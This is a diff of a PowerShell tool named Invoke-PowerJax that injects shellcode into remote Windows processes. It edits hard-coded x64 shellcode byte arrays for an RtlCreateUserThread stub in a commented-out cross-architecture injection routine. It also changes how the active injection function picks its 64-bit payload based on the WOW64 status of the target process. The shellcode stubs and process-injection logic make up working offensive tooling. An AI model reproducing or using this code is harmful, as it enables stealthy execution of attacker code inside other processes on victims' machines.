@@ -428,8 +428,8 @@ function Invoke-PowerJax{
         
 
     }
+    
     <#
-
     Function Invoke-RemoteXarchInjection{
         
         param(
@@ -466,24 +466,25 @@ function Invoke-PowerJax{
             #https://disman.tl/2015/03/16/cross-architecture-reflective-dll-inection.html
             #https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/migrate/remotethread.asm
             #https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1
-            $RtlCreateUserThreadSC1 = @(0xfc,0x51,0x5e,0x54,0x5f,0x48,0x83,0xe4,0xf0,0x4d,0x31,0xc9,0x41,0x51,0x48,0x8d,0x46,0x18,0x50,0x48,0x31,0xc9,0x51,0x68)
-            $RtlCreateUserThreadSC2 = @(0x41,0x51,0x41,0x51,0x6a,0x01,0x41,0x58,0x48,0x31,0xd2,0x68)
-            $RtlCreateUserThreadSC3 = @(0x59,0x41,0xba,0xc8,0x38,0xa4,0x40,0xff,0xd5,0x48,0x85,0xc0,0x74,0x05,0x48,0x31,0xc0,0xeb,0x03,0x6a,0x01,0x58,0x48,0x83,0xc4,0x50,0x48,0x89,0xfc,0xc3)
+            $RtlCreateUserThreadSC1 = @(0xfc,0x48,0x89,0xce,0x48,0x89,0xe7,0x48,0x83,0xe4,0xf0,0xe8,0x00,0x00,0x00,0x00,0x4d,0x31,0xc9,0x41,0x51,0x48,0x8d,0x46,0x18,0x68)
+            $RtlCreateUserThreadSC2 = @(0x41,0x51,0x68)
+            $RtlCreateUserThreadSC3 = @(0x41,0x51,0x41,0x51,0x41,0xb8,0x01,0x00,0x00,0x00,0x48,0x31,0xd2,0x48,0x8b,0x0e,0x41,0xba,0xc8,0x38,0xa4,0x40,0xff,0xd5,0x48,0x85,0xc0,0x74,0x05,0x48,0x31,0xc0,0xeb,0x05,0xb8,0x01,0x00,0x00,0x00,0x48,0x83,0xc4,0x50,0x48,0x89,0xfc,0xc3)
 
             $SCLength = ($RtlCreateUserThreadSC1.Length + $RtlCreateUserThreadSC2.Length + $RtlCreateUserThreadSC3.Length + ($SizeofPtr * 2))
            
             $PoshSCAddr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
             
-
+            $PHandlePtr = [IntPtr]::Zero
+            $PHPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PHandlePtr)
             $SavedAddr = $PoshSCAddr
 
             Write-BytesToMemory -Bytes $RtlCreateUserThreadSC1 -MemoryAddress $PoshSCAddr
             $PoshSCAddr = Add-SignedIntAsUnsigned $PoshSCAddr ($RtlCreateUserThreadSC1.Length)
-            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteSCAddr, $PoshSCAddr, $false)
+            [System.Runtime.InteropServices.Marshal]::StructureToPtr($PHPtr, $PoshSCAddr, $false)
             $PoshSCAddr = Add-SignedIntAsUnsigned $PoshSCAddr ($SizeofPtr)
             Write-BytesToMemory -Bytes $RtlCreateUserThreadSC2 -MemoryAddress $PoshSCAddr
             $PoshSCAddr = Add-SignedIntAsUnsigned $PoshSCAddr ($RtlCreateUserThreadSC2.Length)
-            [System.Runtime.InteropServices.Marshal]::StructureToPtr($PHandle, $PoshSCAddr,$false)
+            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteSCAddr, $PoshSCAddr,$false)
             $PoshSCAddr = Add-SignedIntAsUnsigned $PoshSCAddr ($SizeofPtr)
             Write-BytesToMemory -Bytes $RtlCreateUserThreadSC3 -MemoryAddress $PoshSCAddr
             $PoshSCAddr = Add-SignedIntAsUnsigned $PoshSCAddr ($RtlCreateUserThreadSC3.Length)
@@ -552,6 +553,7 @@ function Invoke-PowerJax{
 
     }
     #>
+    
 
 
     Function Invoke-InjectShellcodeRemote{
@@ -559,10 +561,10 @@ function Invoke-PowerJax{
             [Parameter(Position = 0, Mandatory = $True)]
             [IntPtr]$PHandle,
             [Parameter(Mandatory = $False, Position = 1)]
-            [switch]$64
+            [int]$Arch
         )
 
-        If($64){
+        If($Arch -eq 64){
             $script:buf = $script:buf64
         }
 
@@ -596,7 +598,7 @@ function Invoke-PowerJax{
             $Result = $kernel32::IsWow64Process($ProcessHandle, [ref]$IsWow64) #Check if the process is a Wow64 process
             Write-Verbose "IsWow64Process ? $IsWow64"
             if(( -not $IsWow64) -and ($script:CurrProcArc -eq 64)){
-                Invoke-InjectShellcodeRemote -PHandle $ProcessHandle -64
+                Invoke-InjectShellcodeRemote -PHandle $ProcessHandle -Arch 64
             }
             elseif(( -not $IsWow64) -and ($script:CurrProcArc -eq 32)){
                 #Invoke-RemoteXarchInjection -PHandle $ProcessHandle -Arch 64 #Work-In-Progress
